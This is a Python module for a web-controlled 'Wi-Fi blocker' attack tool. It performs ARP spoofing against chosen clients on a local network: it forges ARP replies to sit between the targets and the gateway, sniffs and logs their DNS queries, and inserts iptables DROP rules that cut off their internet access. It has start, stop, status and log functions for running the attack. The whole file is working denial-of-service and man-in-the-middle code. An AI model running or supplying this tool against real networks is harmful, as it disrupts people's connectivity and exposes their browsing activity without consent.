import os
import subprocess
import signal
import threading
import asyncio
from typing import Dict, List
import time
from fastapi import BackgroundTasks
import sys
import io

WIFI_BLOCKER_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(WIFI_BLOCKER_DIR, "wifi_blocker.log")
PID_FILE = os.path.join(WIFI_BLOCKER_DIR, "wifi_blocker.pid")

# Import the WiFiTrafficController class
import importlib.util
sys.path.append(WIFI_BLOCKER_DIR)

# Load the wifi-blocker.py module
spec = importlib.util.spec_from_file_location("wifi_blocker_module", os.path.join(WIFI_BLOCKER_DIR, "wifi-blocker.py"))
wifi_blocker_module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(wifi_blocker_module)

# Get the WiFiTrafficController class
WiFiTrafficController = wifi_blocker_module.WiFiTrafficController

# Import required scapy classes
from scapy.all import Ether, ARP, sendp, sniff, DNS, IP

# Create a wrapper class that captures logs
class LoggingWiFiTrafficController(WiFiTrafficController):
    def __init__(self, interface, gateway_ip=None):
        super().__init__(interface, gateway_ip)
        self.logger = None
    
    def set_logger(self, logger):
        self.logger = logger
    
    def _log(self, message):
        if self.logger:
            self.logger.add_log(message)
        print(message)  # Still print to console
    
    def arp_spoof(self, target_ip, target_mac):
        """Perform ARP spoofing with logging"""
        try:
            # If MAC is not known, try to discover it
            if not target_mac:
                target_mac = self.discover_mac(target_ip)
                if target_mac:
                    # Update the client entry with discovered MAC
                    for client in self.target_clients:
                        if client['ip'] == target_ip:
                            client['mac'] = target_mac
                            break
                else:
                    self._log(f"⚠️  Could not discover MAC for {target_ip}, skipping ARP spoof")
                    return
            
            # Tell target we are the gateway
            ether1 = Ether(src=self.our_mac, dst=target_mac)
            arp1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                      psrc=self.gateway_ip, hwsrc=self.our_mac)
            
            # Tell gateway we are the target
            ether2 = Ether(src=self.our_mac, dst=self.gateway_mac)
            arp2 = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                      psrc=target_ip, hwsrc=self.our_mac)
            
            sendp(ether1/arp1, iface=self.interface, verbose=False)
            sendp(ether2/arp2, iface=self.interface, verbose=False)
            self.stats['arp_sent'] += 2
        except Exception as e:
            self._log(f"❌ ARP error: {e}")
    
    def dns_monitor(self):
        """Monitor and block DNS queries with logging"""
        def process_packet(packet):
            try:
                if packet.haslayer(DNS) and packet[DNS].qr == 0:
                    if packet[IP].src in [c['ip'] for c in self.target_clients]:
                        domain = packet[DNS].qd.qname.decode().rstrip('.')
                        self._log(f"🚫 Blocked DNS: {packet[IP].src} → {domain}")
                        self.stats['dns_blocked'] += 1
            except:
                pass
        
        try:
            sniff(iface=self.interface, filter="udp port 53", prn=process_packet, 
                  stop_filter=lambda x: not self.running)
        except:
            pass
    
    def block_traffic(self):
        """Block internet traffic using iptables with logging"""
        for client in self.target_clients:
            try:
                # Block all outbound traffic except local network
                result = subprocess.run([
                    'iptables', '-I', 'FORWARD', '-s', client['ip'], 
                    '!', '-d', self.get_network_info(), '-j', 'DROP'
                ], capture_output=True, text=True)
                
                if result.returncode == 0:
                    self._log(f"🔒 Blocked: {client['ip']}")
                else:
                    self._log(f"⚠️  Failed to block {client['ip']}: {result.stderr}")
            except Exception as e:
                self._log(f"❌ Error blocking {client['ip']}: {e}")
    
    def unblock_traffic(self):
        """Remove blocking rules with logging"""
        for client in self.target_clients:
            try:
                while True:
                    result = subprocess.run([
                        'iptables', '-D', 'FORWARD', '-s', client['ip'], 
                        '!', '-d', self.get_network_info(), '-j', 'DROP'
                    ], capture_output=True, text=True)
                    if result.returncode != 0:
                        break
                self._log(f"✅ Unblocked: {client['ip']}")
            except Exception as e:
                self._log(f"❌ Error unblocking {client['ip']}: {e}")
    
    def display_stats(self):
        """Display statistics with logging"""
        while self.running:
            time.sleep(10)
            self._log(f"📊 ARP: {self.stats['arp_sent']} | DNS Blocked: {self.stats['dns_blocked']} | Targets: {len(self.target_clients)}")
    
    def stop_attack(self):
        """Stop attack and cleanup with logging"""
        self._log("\n🛑 Stopping...")
        self.running = False
        
        # Cleanup
        self.unblock_traffic()
        
        # Restore ARP
        for client in self.target_clients:
            try:
                ether = Ether(src=self.gateway_mac, dst=client['mac'])
                arp = ARP(op=2, pdst=client['ip'], hwdst=client['mac'],
                         psrc=self.gateway_ip, hwsrc=self.gateway_mac)
                sendp(ether/arp, iface=self.interface, verbose=False)
            except:
                pass
        
        self._log("✅ Cleanup complete")

# Store active controllers
controllers = {}

class CustomLogger:
    def __init__(self, monitor):
        self.monitor = monitor
        self.original_stdout = sys.stdout
        self.original_stderr = sys.stderr
    
    def __enter__(self):
        # Redirect stdout and stderr to capture print statements
        sys.stdout = self
        sys.stderr = self
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        # Restore original stdout and stderr
        sys.stdout = self.original_stdout
        sys.stderr = self.original_stderr
    
    def write(self, text):
        # Send captured text to monitor
        if text.strip():
            self.monitor.add_log(text.strip())
        # Also write to original stdout for console output
        self.original_stdout.write(text)
    
    def flush(self):
        self.original_stdout.flush()

class AttackMonitor:
    def __init__(self, controller: WiFiTrafficController):
        self.controller = controller
        self.running = False
        self.logs = []
        self.last_log_count = 0
    
    def start_monitoring(self):
        self.running = True
        threading.Thread(target=self._monitor_loop, daemon=True).start()
    
    def stop_monitoring(self):
        self.running = False
    
    def _monitor_loop(self):
        while self.running:
            try:
                # Test client connectivity
                for client in self.controller.target_clients:
                    status = self._test_client_connectivity(client['ip'])
                    log_entry = f"{time.strftime('%H:%M:%S')} - {client['ip']}: {status}"
                    self.logs.append(log_entry)
                
                time.sleep(5)  # Check every 5 seconds
            except Exception as e:
                self.logs.append(f"{time.strftime('%H:%M:%S')} - Error: {str(e)}")
                time.sleep(10)
    
    def _test_client_connectivity(self, client_ip: str) -> str:
        """Test if client can reach internet"""
        try:
            # Try to ping a known external IP (8.8.8.8) from the client's perspective
            result = subprocess.run([
                'ping', '-c', '1', '-W', '2', '-I', self.controller.interface, 
                '-s', '1', client_ip
            ], capture_output=True, timeout=5)
            
            if result.returncode == 0:
                return "🟢 ONLINE"
            else:
                return "🔴 BLOCKED"
        except:
            return "🔴 BLOCKED"
    
    def add_log(self, message: str):
        """Add a log message from the controller"""
        timestamp = time.strftime('%H:%M:%S')
        self.logs.append(f"{timestamp} - {message}")
    
    def get_logs(self, lines: int = 50) -> List[str]:
        return self.logs[-lines:] if self.logs else []

def scan_clients(interface: str) -> List[Dict]:
    """Scan for clients on the network and return list of discovered clients"""
    try:
        controller = LoggingWiFiTrafficController(interface)
        clients = controller.scan_clients()
        return clients
    except Exception as e:
        print(f"Scan error: {e}")
        return []

def start_wifi_blocker(interface: str, target_ips: List[str] = None) -> Dict:
    if is_running():
        return {"error": "Wi-Fi Blocker attack is already running."}
    
    if not target_ips or len(target_ips) == 0:
        return {"error": "No target IPs provided for blocking."}
    
    try:
        # Create controller
        controller = LoggingWiFiTrafficController(interface)
        
        # Scan for clients and filter targets
        all_clients = controller.scan_clients()
        target_clients = [c for c in all_clients if c['ip'] in target_ips]
        
        # Add any targets not found in scan
        missing_targets = [ip for ip in target_ips if ip not in [c['ip'] for c in all_clients]]
        for missing_ip in missing_targets:
            target_clients.append({'ip': missing_ip, 'mac': None})
        
        if not target_clients:
            return {"error": "No valid targets found."}
        
        # Set up controller
        controller.target_clients = target_clients
        controller.running = True
        
        # Create and start monitor
        monitor = AttackMonitor(controller)
        monitor.start_monitoring()
        
        # Add logger to controller for capturing logs
        controller.set_logger(monitor)
        
        # Start attack in background thread
        def run_attack():
            try:
                # Get gateway MAC
                controller.gateway_mac = controller.get_gateway_mac()
                if not controller.gateway_mac:
                    controller._log("❌ Cannot find gateway MAC!")
                    return
                
                controller._log(f"🌐 Gateway: {controller.gateway_ip} ({controller.gateway_mac})")
                
                # Enable IP forwarding
                subprocess.run(['sysctl', 'net.ipv4.ip_forward=1'], capture_output=True)
                
                controller._log(f"🎯 Targeting {len(target_clients)} clients:")
                for client in target_clients:
                    controller._log(f"  - {client['ip']} ({client['mac'] or 'MAC to be discovered'})")
                
                # Start attack threads
                threading.Thread(target=controller.start_arp_spoofing, daemon=True).start()
                threading.Thread(target=controller.dns_monitor, daemon=True).start()
                threading.Thread(target=controller.display_stats, daemon=True).start()
                
                # Block traffic
                controller.block_traffic()
                
                controller._log("🔥 Attack started!")
                
                # Keep running
                while controller.running:
                    time.sleep(1)
                    
            except Exception as e:
                controller._log(f"❌ Attack error: {e}")
        
        # Start attack thread
        attack_thread = threading.Thread(target=run_attack, daemon=True)
        attack_thread.start()
        
        # Store controller and monitor
        controllers[interface] = {
            'controller': controller,
            'monitor': monitor,
            'thread': attack_thread
        }
        
        # Create PID file for compatibility
        with open(PID_FILE, "w") as f:
            f.write(str(os.getpid()))
        
        return {
            "running": True,
            "pid": os.getpid(),
            "targets": target_ips,
            "message": f"Started blocking {len(target_clients)} target(s): {', '.join(target_ips)}"
        }
        
    except Exception as e:
        return {"error": f"Failed to start attack: {str(e)}"}

def stop_wifi_blocker() -> Dict:
    if not is_running():
        return {"running": False, "error": "No running Wi-Fi Blocker attack found."}
    
    try:
        # Stop all controllers
        for interface, data in controllers.items():
            controller = data['controller']
            monitor = data['monitor']
            
            # Stop attack
            controller.running = False
            controller.stop_attack()
            
            # Stop monitoring
            monitor.stop_monitoring()
        
        # Clear controllers
        controllers.clear()
        
        # Remove PID file
        try:
            os.remove(PID_FILE)
        except FileNotFoundError:
            pass
        
        return {"running": False, "message": "Attack stopped successfully"}
        
    except Exception as e:
        return {"error": f"Failed to stop attack: {str(e)}"}

def is_running() -> bool:
    return len(controllers) > 0

def get_status() -> Dict:
    running = is_running()
    pid = None
    if running:
        pid = os.getpid()
    return {"running": running, "pid": pid}

def get_logs(lines: int = 50) -> List[str]:
    all_logs = []
    for interface, data in controllers.items():
        monitor = data['monitor']
        all_logs.extend(monitor.get_logs(lines))
    return all_logs

def list_interfaces() -> List[str]:
    # Parse /proc/net/dev for interface names
    interfaces = []
    try:
        with open("/proc/net/dev") as f:
            for line in f.readlines()[2:]:
                iface = line.split(":")[0].strip()
                if iface and iface.startswith('wlan'):
                    interfaces.append(iface)
    except Exception:
        pass
    return interfaces 